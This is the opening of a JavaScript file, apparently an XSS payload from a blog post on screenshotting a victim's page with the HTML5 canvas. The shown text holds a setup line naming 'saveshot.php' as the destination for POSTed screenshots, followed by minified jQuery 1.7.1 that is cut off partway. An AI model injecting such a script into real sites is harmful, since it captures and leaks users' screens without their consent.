// URL: http://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas

if (typeof vx === &#39;undefined&#39;) {
	
// The destination to POST the screenshot to - change it here
var postDest = &#39;saveshot.php&#39;;

var vx = &#39;ok&#39;;

/*! jQuery v1.7.1 jquery.com | jquery.org/license */
(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!ck[a]){var b=c.body,d=f(&#34;&lt;&#34;+a+&#34;&gt;&#34;).appendTo(b),e=d.css(&#34;display&#34;);d.remove();if(e===&#34;none&#34;||e===&#34;&#34;){cl||(cl=c.createElement(&#34;iframe&#34;),cl.frameBorder=cl.width=cl.height=0),b.appendChild(cl);if(!cm||!cl.createElement)cm=(cl.contentWindow||cl.contentDocument).document,cm.write((c.compatMode===&#34;CSS1Compat&#34;?&#34;&lt;!doctype html&gt;&#34;:&#34;&#34;)+&#34;&lt;html&gt;&lt;body&gt;&#34;),cm.close();d=cm.createElement(a),cm.body.appendChild(d),e=f.css(d,&#34;display&#34;),b.removeChild(cl)}ck[a]=e}return ck[a]}function cu(a,b){var c={};f.each(cq.concat.apply([],cq.slice(0,b)),function(){c[this]=a});return c}function ct(){cr=b}function cs(){setTimeout(ct,0);return cr=f.now()}function cj(){try{return new a.ActiveXObject(&#34;Microsoft.XMLHTTP&#34;)}catch(b){}}function ci(){try{return new a.XMLHttpRequest}catch(b){}}function cc(a,c){a.dataFilter&amp;&amp;(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g&lt;i;g++){if(g===1)for(h in a.converters)typeof h==&#34;string&#34;&amp;&amp;(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k===&#34;*&#34;)k=l;else if(l!==&#34;*&#34;&amp;&amp;l!==k){m=l+&#34; &#34;+k,n=e[m]||e[&#34;* &#34;+k];if(!n){p=b;for(o in e){j=o.split(&#34; &#34;);if(j[0]===l||j[0]===&#34;*&#34;){p=e[j[1]+&#34; &#34;+k];if(p){o=e[o],o===!0?n=p:p===!0&amp;&amp;(n=o);break}}}}!n&amp;&amp;!p&amp;&amp;f.error(&#34;No conversion from &#34;+m.replace(&#34; &#34;,&#34; to &#34;)),n!==!0&amp;&amp;(c=n?n(c):p(o(c)))}}return c}function cb(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&amp;&amp;(c[g[i]]=d[i]);while(f[0]===&#34;*&#34;)f.shift(),h===b&amp;&amp;(h=a.mimeType||c.getResponseHeader(&#34;content-type&#34;));if(h)for(i in e)if(e[i]&amp;&amp;e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+&#34; &#34;+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&amp;&amp;f.unshift(j);return d[j]}}function ca(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bE.test(a)?d(a,e):ca(a+&#34;[&#34;+(typeof e==&#34;object&#34;||f.isArray(e)?b:&#34;&#34;)+&#34;]&#34;,e,c,d)});else if(!c&amp;&amp;b!=null&amp;&amp;typeof b==&#34;object&#34;)for(var e in b)ca(a+&#34;[&#34;+e+&#34;]&#34;,b[e],c,d);else d(a,b)}function b_(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&amp;&amp;((g[d]?a:e||(e={}))[d]=c[d]);e&amp;&amp;f.extend(!0,a,e)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bT,l;for(;i&lt;j&amp;&amp;(k||!l);i++)l=h[i](c,d,e),typeof l==&#34;string&#34;&amp;&amp;(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&amp;&amp;!g[&#34;*&#34;]&amp;&amp;(l=b$(a,c,d,e,&#34;*&#34;,g));return l}function bZ(a){return function(b,c){typeof b!=&#34;string&#34;&amp;&amp;(c=b,b=&#34;*&#34;);if(f.isFunction(c)){var d=b.toLowerCase().split(bP),e=0,g=d.length,h,i,j;for(;e&lt;g;e++)h=d[e],j=/^\+/.test(h),j&amp;&amp;(h=h.substr(1)||&#34;*&#34;),i=a[h]=a[h]||[],i[j?&#34;unshift&#34;:&#34;push&#34;](c)}}}function bC(a,b,c){var d=b===&#34;width&#34;?a.offsetWidth:a.offsetHeight,e=b===&#34;width&#34;?bx:by,g=0,h=e.length;if(d&gt;0){if(c!==&#34;border&#34;)for(;g&lt;h;g++)c||(d-=parseFloat(f.css(a,&#34;padding&#34;+e[g]))||0),c===&#34;margin&#34;?d+=parseFloat(f.css(a,c+e[g]))||0:d-=parseFloat(f.css(a,&#34;border&#34;+e[g]+&#34;Width&#34;))||0;return d+&#34;px&#34;}d=bz(a,b,b);if(d&lt;0||d==null)d=a.style[b]||0;d=parseFloat(d)||0;if(c)for(;g&lt;h;g++)d+=parseFloat(f.css(a,&#34;padding&#34;+e[g]))||0,c!==&#34;padding&#34;&amp;&amp;(d+=parseFloat(f.css(a,&#34;border&#34;+e[g]+&#34;Width&#34;))||0),c===&#34;margin&#34;&amp;&amp;(d+=parseFloat(f.css(a,c+e[g]))||0);return d+&#34;px&#34;}function bp(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:&#34;script&#34;}):f.globalEval((b.text||b.textContent||b.innerHTML||&#34;&#34;).replace(bf,&#34;/*$0*/&#34;)),b.parentNode&amp;&amp;b.parentNode.removeChild(b)}function bo(a){var b=c.createElement(&#34;div&#34;);bh.appendChild(b),b.innerHTML=a.outerHTML;return b.firstChild}function bn(a){var b=(a.nodeName||&#34;&#34;).toLowerCase();b===&#34;input&#34;?bm(a):b!==&#34;script&#34;&amp;&amp;typeof a.getElementsByTagName!=&#34;undefined&#34;&amp;&amp;f.grep(a.getElementsByTagName(&#34;input&#34;),bm)}function bm(a){if(a.type===&#34;checkbox&#34;||a.type===&#34;radio&#34;)a.defaultChecked=a.checked}function bl(a){return typeof a.getElementsByTagName!=&#34;undefined&#34;?a.getElementsByTagName(&#34;*&#34;):typeof a.querySelectorAll!=&#34;undefined&#34;?a.querySelectorAll(&#34;*&#34;):[]}function bk(a,b){var c;if(b.nodeType===1){b.clearAttributes&amp;&amp;b.clearAttributes(),b.mergeAttributes&amp;&amp;b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c===&#34;object&#34;)b.outerHTML=a.outerHTML;else if(c!==&#34;input&#34;||a.type!==&#34;checkbox&#34;&amp;&amp;a.type!==&#34;radio&#34;){if(c===&#34;option&#34;)b.selected=a.defaultSelected;else if(c===&#34;input&#34;||c===&#34;textarea&#34;)b.defaultValue=a.defaultValue}else a.checked&amp;&amp;(b.defaultChecked=b.checked=a.checked),b.value!==a.value&amp;&amp;(b.value=a.value);b.removeAttribute(f.expando)}}function bj(a,b){if(b.nodeType===1&amp;&amp;!!f.hasData(a)){var c,d,e,g=f._data(a),h=f._data(b,g),i=g.events;if(i){delete h.handle,h.events={};for(c in i)for(d=0,e=i[c].length;d&lt;e;d++)f.event.add(b,c+(i[c][d].namespace?&#34;.&#34;:&#34;&#34;)+i[c][d].namespace,i[c][d],i[c][d].data)}h.data&amp;&amp;(h.data=f.extend({},h.data))}}function bi(a,b){return f.nodeName(a,&#34;table&#34;)?a.getElementsByTagName(&#34;tbody&#34;)[0]||a.appendChild(a.ownerDocument.createElement(&#34;tbody&#34;)):a}function U(a){var b=V.split(&#34;|&#34;),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}function T(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b==&#34;string&#34;){var d=f.grep(a,function(a){return a.nodeType===1});if(O.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)&gt;=0===c})}function S(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function K(){return!0}function J(){return!1}function n(a,b,c){var d=b+&#34;defer&#34;,e=b+&#34;queue&#34;,g=b+&#34;mark&#34;,h=f._data(a,d);h&amp;&amp;(c===&#34;queue&#34;||!f._data(a,e))&amp;&amp;(c===&#34;mark&#34;||!f._data(a,g))&amp;&amp;setTimeout(function(){!f._data(a,e)&amp;&amp;!f._data(a,g)&amp;&amp;(f.removeData(a,d,!0),h.fire())},0)}function m(a){for(var b in a){if(b===&#34;data&#34;&amp;&amp;f.isEmptyObject(a[b]))continue;if(b!==&#34;toJSON&#34;)return!1}return!0}function l(a,c,d){if(d===b&amp;&amp;a.nodeType===1){var e=&#34;data-&#34;+c.replace(k,&#34;-$1&#34;).toLowerCase();d=a.getAttribute(e);if(typeof d==&#34;string&#34;){try{d=d===&#34;true&#34;?!0:d===&#34;false&#34;?!1:d===&#34;null&#34;?null:f.isNumeric(d)?parseFloat(d):j.test(d)?f.parseJSON(d):d}catch(g){}f.data(a,c,d)}else d=b}return d}function h(a){var b=g[a]={},c,d;a=a.split(/\s+/);for(c=0,d=a.length;c&lt;d;c++)b[a[c]]=!0;return b}var c=a.document,d=a.navigator,e=a.location,f=function(){function J(){if(!e.isReady){try{c.documentElement.doScroll(&#34;left&#34;)}catch(a){setTimeout(J,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#&lt;]*(&lt;[\w\W]+&gt;)[^&gt;]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/^&lt;(\w+)\s*\/?&gt;(?:&lt;\/\1&gt;)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:[&#34;\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/&#34;[^&#34;\\\n\r]*&#34;|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=/-([a-z]|[0-9])/ig,w=/^-ms-/,x=function(a,b){return(b+&#34;&#34;).toUpperCase()},y=d.userAgent,z,A,B,C=Object.prototype.toString,D=Object.prototype.hasOwnProperty,E=Array.prototype.push,F=Array.prototype.slice,G=String.prototype.trim,H=Array.prototype.indexOf,I={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a===&#34;body&#34;&amp;&amp;!d&amp;&amp;c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a==&#34;string&#34;){a.charAt(0)!==&#34;&lt;&#34;||a.charAt(a.length-1)!==&#34;&gt;&#34;||a.length&lt;3?g=i.exec(a):g=[null,a,null];if(g&amp;&amp;(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=m.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&amp;&amp;h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&amp;&amp;(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:&#34;&#34;,jquery:&#34;1.7.1&#34;,length:0,size:function(){return this.length},toArray:function(){return F.call(this,0)},get:function(a){return a==null?this.toArray():a&lt;0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?E.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b===&#34;find&#34;?d.selector=this.selector+(this.selector?&#34; &#34;:&#34;&#34;)+c:b&amp;&amp;(d.selector=this.selector+&#34;.&#34;+b+&#34;(&#34;+c+&#34;)&#34;);return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),A.add(a);return this},eq:function(a){a=+a;return a===-1?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(F.apply(this,arguments),&#34;slice&#34;,F.call(arguments).join(&#34;,&#34;))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:E,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i==&#34;boolean&#34;&amp;&amp;(l=i,i=arguments[1]||{},j=2),typeof i!=&#34;object&#34;&amp;&amp;!e.isFunction(i)&amp;&amp;(i={}),k===j&amp;&amp;(i=this,--j);for(;j&lt;k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&amp;&amp;f&amp;&amp;(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&amp;&amp;e.isArray(d)?d:[]):h=d&amp;&amp;e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&amp;&amp;(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&amp;&amp;(a.$=g),b&amp;&amp;a.jQuery===e&amp;&amp;(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&amp;&amp;!--e.readyWait||a!==!0&amp;&amp;!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&amp;&amp;--e.readyWait&gt;0)return;A.fireWith(c,[e]),e.fn.trigger&amp;&amp;e(c).trigger(&#34;ready&#34;).off(&#34;ready&#34;)}},bindReady:function(){if(!A){A=e.Callbacks(&#34;once memory&#34;);if(c.readyState===&#34;complete&#34;)return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener(&#34;DOMContentLoaded&#34;,B,!1),a.addEventListener(&#34;load&#34;,e.ready,!1);else if(c.attachEvent){c.attachEvent(&#34;onreadystatechange&#34;,B),a.attachEvent(&#34;onload&#34;,e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&amp;&amp;b&amp;&amp;J()}}},isFunction:function(a){return e.type(a)===&#34;function&#34;},isArray:Array.isArray||function(a){return e.type(a)===&#34;array&#34;},isWindow:function(a){return a&amp;&amp;typeof a==&#34;object&#34;&amp;&amp;&#34;setInterval&#34;in a},isNumeric:function(a){return!isNaN(parseFloat(a))&amp;&amp;isFinite(a)},type:function(a){return a==null?String(a):I[C.call(a)]||&#34;object&#34;},isPlainObject:function(a){if(!a||e.type(a)!==&#34;object&#34;||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&amp;&amp;!D.call(a,&#34;constructor&#34;)&amp;&amp;!D.call(a.constructor.prototype,&#34;isPrototypeOf&#34;))return!1}catch(c){return!1}var d;for(d in a);return d===b||D.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw new Error(a)},parseJSON:function(b){if(typeof b!=&#34;string&#34;||!b)return null;b=e.trim(b);if(a.JSON&amp;&amp;a.JSON.parse)return a.JSON.parse(b);if(n.test(b.replace(o,&#34;@&#34;).replace(p,&#34;]&#34;).replace(q,&#34;&#34;)))return(new Function(&#34;return &#34;+b))();e.error(&#34;Invalid JSON: &#34;+b)},parseXML:function(c){var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,&#34;text/xml&#34;)):(d=new ActiveXObject(&#34;Microsoft.XMLDOM&#34;),d.async=&#34;false&#34;,d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName(&#34;parsererror&#34;).length)&amp;&amp;e.error(&#34;Invalid XML: &#34;+c);return d},noop:function(){},globalEval:function(b){b&amp;&amp;j.test(b)&amp;&amp;(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(w,&#34;ms-&#34;).replace(v,x)},nodeName:function(a,b){return a.nodeName&amp;&amp;a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g&lt;h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g&lt;h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:G?function(a){return a==null?&#34;&#34;:G.call(a)}:function(a){return a==null?&#34;&#34;:(a+&#34;&#34;).replace(k,&#34;&#34;).replace(l,&#34;&#34;)},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d===&#34;string&#34;||d===&#34;function&#34;||d===&#34;regexp&#34;||e.isWindow(a)?E.call(c,a):e.merge(c,a)}return c},inArray:function(a,b,c){var d;if(b){if(H)return H.call(b,a,c);d=b.length,c=c?c&lt;0?Math.max(0,d+c):c:0;for(;c&lt;d;c++)if(c in b&amp;&amp;b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length==&#34;number&#34;)for(var f=c.length;e&lt;f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f&lt;g;f++)e=!!b(a[f],f),c!==e&amp;&amp;d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&amp;&amp;typeof j==&#34;number&#34;&amp;&amp;(j&gt;0&amp;&amp;a[0]&amp;&amp;a[j-1]||j===0||e.isArray(a));if(k)for(;i&lt;j;i++)f=c(a[i],i,d),f!=null&amp;&amp;(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&amp;&amp;(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c==&#34;string&#34;){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=F.call(arguments,2),g=function(){return a.apply(c,f.concat(F.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c==&#34;object&#34;){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&amp;&amp;f&amp;&amp;e.isFunction(d);for(var k=0;k&lt;i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf(&#34;compatible&#34;)&lt;0&amp;&amp;u.exec(a)||[];return{browser:b[1]||&#34;&#34;,version:b[2]||&#34;0&#34;}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&amp;&amp;f instanceof e&amp;&amp;!(f instanceof a)&amp;&amp;(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each(&#34;Boolean Number String Function Array Date RegExp Object&#34;.split(&#34; &#34;),function(a,b){I[&#34;[object &#34;+b+&#34;]&#34;]=b.toLowerCase()}),z=e.uaMatch(y),z.browser&amp;&amp;(e.browser[z.browser]=!0,e.browser.version=z.version),e.browser.webkit&amp;&amp;(e.browser.safari=!0),j.test(&#34;Â &#34;)&amp;&amp;(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?B=function(){c.removeEventListener(&#34;DOMContentLoaded&#34;,B,!1),e.ready()}:c.attachEvent&amp;&amp;(B=function(){c.readyState===&#34;complete&#34;&amp;&amp;(c.detachEvent(&#34;onreadystatechange&#34;,B),e.ready())});return e}(),g={};f.Callbacks=function(a){a=a?g[a]||h(a):{};var c=[],d=[],e,i,j,k,l,m=function(b){var d,e,g,h,i;for(d=0,e=b.length;d&lt;e;d++)g=b[d],h=f.type(g),h===&#34;array&#34;?m(g):h===&#34;function&#34;&amp;&amp;(!a.unique||!o.has(g))&amp;&amp;c.push(g)},n=function(b,f){f=f||[],e=!a.memory||[b,f],i=!0,l=j||0,j=0,k=c.length;for(;c&amp;&amp;l&lt;k;l++)if(c[l].apply(b,f)===!1&amp;&amp;a.stopOnFalse){e=!0;break}i=!1,c&amp;&amp;(a.once?e===!0?o.disable():c=[]:d&amp;&amp;d.length&amp;&amp;(e=d.shift(),o.fireWith(e[0],e[1])))},o={add:function(){if(c){var a=c.length;m(arguments),i?k=c.length:e&amp;&amp;e!==!0&amp;&amp;(j=a,n(e[0],e[1]))}return this},remove:function(){if(c){var b=arguments,d=0,e=b.length;for(;d&lt;e;d++)for(var f=0;f&lt;c.length;f++)if(b[d]===c[f]){i&amp;&amp;f&lt;=k&amp;&amp;(k--,f&lt;=l&amp;&amp;l--),c.splice(f--,1);if(a.unique)break}}return this},has:function(a){if(c){var b=0,d=c.length;for(;b&lt;d;b++)if(a===c[b])return!0}return!1},empty:function(){c=[];return this},disable:function(){c=d=e=b;return this},disabled:function(){return!c},lock:function(){d=b,(!e||e===!0)&amp;&amp;o.disable();return this},locked:function(){return!d},fireWith:function(b,c){d&amp;&amp;(i?a.once||d.push([b,c]):(!a.once||!e)&amp;&amp;n(b,c));return this},fire:function(){o.fireWith(this,arguments);return this},fired:function(){return!!e}};return o};var i=[].slice;f.extend({Deferred:function(a){var b=f.Callbacks(&#34;once memory&#34;),c=f.Callbacks(&#34;once memory&#34;),d=f.Callbacks(&#34;memory&#34;),e=&#34;pending&#34;,g={resolve:b,reject:c,notify:d},h={done:b.add,fail:c.add,progress:d.add,state:function(){return e},isResolved:b.fired,isRejected:c.fired,then:function(a,b,c){i.done(a).fail(b).progress(c);return this},always:function(){i.done.apply(i,arguments).fail.apply(i,arguments);return this},pipe:function(a,b,c){return f.Deferred(function(d){f.each({done:[a,&#34;resolve&#34;],fail:[b,&#34;reject&#34;],progress:[c,&#34;notify&#34;]},function(a,b){var c=b[0],e=b[1],g;f.isFunction(c)?i[a](function(){g=c.apply(this,arguments),g&amp;&amp;f.isFunction(g.promise)?g.promise().then(d.resolve,d.reject,d.notify):d[e+&#34;With&#34;](this===i?d:this,[g])}):i[a](d[e])})}).promise()},promise:function(a){if(a==null)a=h;else for(var b in h)a[b]=h[b];return a}},i=h.promise({}),j;for(j in g)i[j]=g[j].fire,i[j+&#34;With&#34;]=g[j].fireWith;i.done(function(){e=&#34;resolved&#34;},c.disable,d.lock).fail(function(){e=&#34;rejected&#34;},b.disable,d.lock),a&amp;&amp;a.call(i,i);return i},when:function(a){function m(a){return function(b){e[a]=arguments.length&gt;1?i.call(arguments,0):b,j.notifyWith(k,e)}}function l(a){return function(c){b[a]=arguments.length&gt;1?i.call(arguments,0):c,--g||j.resolveWith(j,b)}}var b=i.call(arguments,0),c=0,d=b.length,e=Array(d),g=d,h=d,j=d&lt;=1&amp;&amp;a&amp;&amp;f.isFunction(a.promise)?a:f.Deferred(),k=j.promise();if(d&gt;1){for(;c&lt;d;c++)b[c]&amp;&amp;b[c].promise&amp;&amp;f.isFunction(b[c].promise)?b[c].promise().then(l(c),j.reject,m(c)):--g;g||j.resolveWith(j,b)}else j!==a&amp;&amp;j.resolveWith(j,d?[a]:[]);return k}}),f.support=function(){var b,d,e,g,h,i,j,k,l,m,n,o,p,q=c.createElement(&#34;div&#34;),r=c.documentElement;q.setAttribute(&#34;className&#34;,&#34;t&#34;),q.innerHTML=&#34;   &lt;link/&gt;&lt;table&gt;&lt;/table&gt;&lt;a href=&#39;/a&#39; style=&#39;top:1px;float:left;opacity:.55;&#39;&gt;a&lt;/a&gt;&lt;input type=&#39;checkbox&#39;/&gt;&#34;,d=q.getElementsByTagName(&#34;*&#34;),e=q.getElementsByTagName(&#34;a&#34;)[0];if(!d||!d.length||!e)return{};g=c.createElement(&#34;select&#34;),h=g.appendChild(c.createElement(&#34;option&#34;)),i=q.getElementsByTagName(&#34;input&#34;)[0],b={leadingWhitespace:q.firstChild.nodeType===3,tbody:!q.getElementsByTagName(&#34;tbody&#34;).length,htmlSerialize:!!q.getElementsByTagName(&#34;link&#34;).length,style:/top/.test(e.getAttribute(&#34;style&#34;)),hrefNormalized:e.getAttribute(&#34;href&#34;)===&#34;/a&#34;,opacity:/^0.55/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value===&#34;on&#34;,optSelected:h.selected,getSetAttribute:q.className!==&#34;t&#34;,enctype:!!c.createElement(&#34;form&#34;).enctype,html5Clone:c.createElement(&#34;nav&#34;).cloneNode(!0).outerHTML!==&#34;&lt;:nav&gt;&lt;/:nav&gt;&#34;,submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},i.checked=!0,b.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,b.optDisabled=!h.disabled;try{delete q.test}catch(s){b.deleteExpando=!1}!q.addEventListener&amp;&amp;q.attachEvent&amp;&amp;q.fireEvent&amp;&amp;(q.attachEvent(&#34;onclick&#34;,function(){b.noCloneEvent=!1}),q.cloneNode(!0).fireEvent(&#34;onclick&#34;)),i=c.createElement(&#34;input&#34;),i.value=&#34;t&#34;,i.setAttribute(&#34;type&#34;,&#34;radio&#34;),b.radioValue=i.value===&#34;t&#34;,i.setAttribute(&#34;checked&#34;,&#34;checked&#34;),q.appendChild(i),k=c.createDocumentFragment(),k.appendChild(q.lastChild),b.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=i.checked,k.removeChild(i),k.appendChild(q),q.innerHTML=&#34;&#34;,a.getComputedStyle&amp;&amp;(j=c.createElement(&#34;div&#34;),j.style.width=&#34;0&#34;,j.style.marginRight=&#34;0&#34;,q.style.width=&#34;2px&#34;,q.appendChild(j),b.reliableMarginRight=(parseInt((a.getComputedStyle(j,null)||{marginRight:0}).marginRight,10)||0)===0);if(q.attachEvent)for(o in{submit:1,change:1,focusin:1})n=&#34;on&#34;+o,p=n in q,p||(q.setAttribute(n,&#34;return;&#34;),p=typeof q[n]==&#34;function&#34;),b[o+&#34;Bubbles&#34;]=p;k.removeChild(q),k=g=h=j=q=i=null,f(function(){var a,d,e,g,h,i,j,k,m,n,o,r=c.getElementsByTagName(&#34;body&#34;)[0];!r||(j=1,k=&#34;position:absolute;top:0;left:0;width:1px;height:1px;margin:0;&#34;,m=&#34;visibility:hidden;border:0;&#34;,n=&#34;style=&#39;&#34;+k+&#34;border:5px solid #000;padding:0;&#39;&#34;,o=&#34;&lt;div &#34;+n+&#34;&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&#34;+&#34;&lt;table &#34;+n+&#34; cellpadding=&#39;0&#39; cellspacing=&#39;0&#39;&gt;&#34;+&#34;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;,a=c.createElement(&#34;div&#34;),a.style.cssText=m+&#34;width:0;height:0;position:static;top:0;margin-top:&#34;+j+&#34;px&#34;,r.insertBefore(a,r.firstChild),q=c.createElement(&#34;div&#34;),a.appendChild(q),q.innerHTML=&#34;&lt;table&gt;&lt;tr&gt;&lt;td style=&#39;padding:0;border:0;display:none&#39;&gt;&lt;/td&gt;&lt;td&gt;t&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;,l=q.getElementsByTagName(&#34;td&#34;),p=l[0].offsetHeight===0,l[0].style.display=&#34;&#34;,l[1].style.display=&#34;none&#34;,b.reliableHiddenOffsets=p&amp;&amp;l[0].offsetHeight===0,q.innerHTML=&#34;&#34;,q.style.width=q.style.paddingLeft=&#34;1px&#34;,f.boxModel=b.boxModel=q.offsetWidth===2,typeof q.style.zoom!=&#34;undefined&#34;&amp;&amp;(q.style.display=&#34;inline&#34;,q.style.zoom=1,b.inlineBlockNeedsLayout=q.offsetWidth===2,q.style.display=&#34;&#34;,q.innerHTML=&#34;&lt;div style=&#39;width:4px;&#39;&gt;&lt;/div&gt;&#34;,b.shrinkWrapBlocks=q.offsetWidth!==2),q.style.cssText=k+m,q.innerHTML=o,d=q.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,i={doesNotAddBorder:e.offsetTop!==5,doesAddBorderForTableAndCells:h.offsetTop===5},e.style.position=&#34;fixed&#34;,e.style.top=&#34;20px&#34;,i.fixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top=&#34;&#34;,d.style.overflow=&#34;hidden&#34;,d.style.position=&#34;relative&#34;,i.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,i.doesNotIncludeMarginInBodyOffset=r.offsetTop!==j,r.removeChild(a),q=a=null,f.extend(b,i))});return b}();var j=/^(?:\{.*\}|\[.*\])$/,k=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:&#34;jQuery&#34;+(f.fn.jquery+Math.random()).replace(/\D/g,&#34;&#34;),noData:{embed:!0,object:&#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&#34;,applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&amp;&amp;!m(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i,j=f.expando,k=typeof 